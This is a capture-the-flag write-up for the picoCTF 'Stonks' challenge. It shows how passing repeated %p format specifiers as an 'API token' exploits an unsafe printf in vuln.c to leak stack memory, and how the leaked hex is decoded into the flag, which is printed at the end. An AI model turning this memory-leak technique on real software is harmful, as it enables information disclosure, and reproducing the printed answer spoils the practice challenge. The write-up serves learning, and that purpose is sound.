### Problem Statement
```txt
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure!

[vuln.c](https://mercury.picoctf.net/static/a4ce675e8f85190152d66014c9eebd7e/vuln.c)
`nc mercury.picoctf.net 59616`

```

---

If we run the command: `nc mercury.picoctf.net 59616`

```console
$ nc mercury.picoctf.net 59616
Welcome back to the trading app!

What would you like to do?
1) Buy some stonks!
2) View my portfolio
1
Using patented AI algorithms to buy stonks
Stonks chosen
What is your API token?
API
Buying stonks with token:
API
Portfolio as of Mon Jan 17 12:10:05 UTC 2022

2 shares of AXAR
1 shares of BA
2 shares of CDCN
6 shares of CP
1 shares of F
11 shares of VRQQ
60 shares of QUV
1132 shares of YY
Goodbye!
```

If we supply the API token as `%p` while running the `nc` command, we get:

```
What is your API token?
%p
Buying stonks with token:
0x89c13b0
```

Upon inspection of `vuln.c`, we find a clue on how we can exploit the program:

```c
// TODO: Figure out how to read token from file, for now just ask

char *user_buf = malloc(300 + 1);
printf("What is your API token?\n");
scanf("%300s", user_buf);
printf("Buying stonks with token:\n");
printf(user_buf);

// TODO: Actually use key to interact with API

view_portfolio(p);
```

Since the API token is printed, we can try and pass multiple `%p` to print pointers.

```console
What is your API token?
%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
Buying stonks with token:
0x92d43500x804b0000x80489c30xf7f95d800xffffffff0x10x92d21600xf7fa31100xf7f95dc7(nil)0x92d31800x20x92d43300x92d43500x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f7
9336e0x383431360x343565620xff81007d
```

So, the pointers text we got is:
```
0x92d43500x804b0000x80489c30xf7f95d800xffffffff0x10x92d21600xf7fa31100xf7f95dc7(nil)0x92d31800x20x92d43300x92d43500x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f7
9336e0x383431360x343565620xff81007d
```

Removing the text before `(nil)` because it's most probably padding of some sort.

```
0x92d31800x20x92d43300x92d43500x6f6369700x7b4654430x306c5f490x345f74350x6d5f6c6c0x306d5f790x5f7
9336e0x383431360x343565620xff81007d
```

Removing the `0x`s from the string because it's most prob something like what we get to indicate hex strings/values.

```
92d3180292d433092d43506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ff81007d
```

Decode this using [`xxd`](https://linux.die.net/man/1/xxd)

```console
$ echo 92d3180292d433092d43506f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e3834313634356562ff81007d | xxd -p -r
����3   -CPocip{FTC0l_I4_t5m_ll0m_y_y3n841645eb��}
```

Encrypted flag:
```
ocip{FTC0l_I4_t5m_ll0m_y_y3n841645eb��}
```

We can get the flag by swapping the edianness @ [CyberChef](https://gchq.github.io/CyberChef/)

---
#### The Flag
    picoCTF{I_l05t_4ll_my_m0n3y_6148be54}

Link to the challenge: [Stonks](https://play.picoctf.org/practice/challenge/105)
